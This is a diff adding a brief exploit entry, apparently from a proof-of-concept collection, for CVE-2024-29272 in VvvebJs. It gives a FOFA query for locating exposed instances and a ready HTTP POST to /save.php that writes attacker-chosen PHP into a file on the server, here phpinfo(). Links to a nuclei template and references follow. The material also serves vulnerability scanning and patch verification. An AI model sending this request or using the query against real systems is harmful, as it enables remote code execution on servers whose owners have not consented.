@@ -1,0 +1,20 @@
+## VvvebJs < 1.7.5 Arbitrary File Upload - RCE (CVE-2024-29272)
+
+## fofa
+```
+icon_hash="524332373"
+```
+## poc
+```
+POST /save.php HTTP/1.1
+Host: 
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+file=demo%2Flanding%2Findex.php&html=<?php%20phpinfo();%20?>
+```
+## nuclei Template
+https://github.com/projectdiscovery/nuclei-templates/pull/10608/files
+
+## ref
+https://github.com/givanz/VvvebJs/issues/343
+https://github.com/awjkjflkwlekfdjs/CVE-2024-29272/tree/main
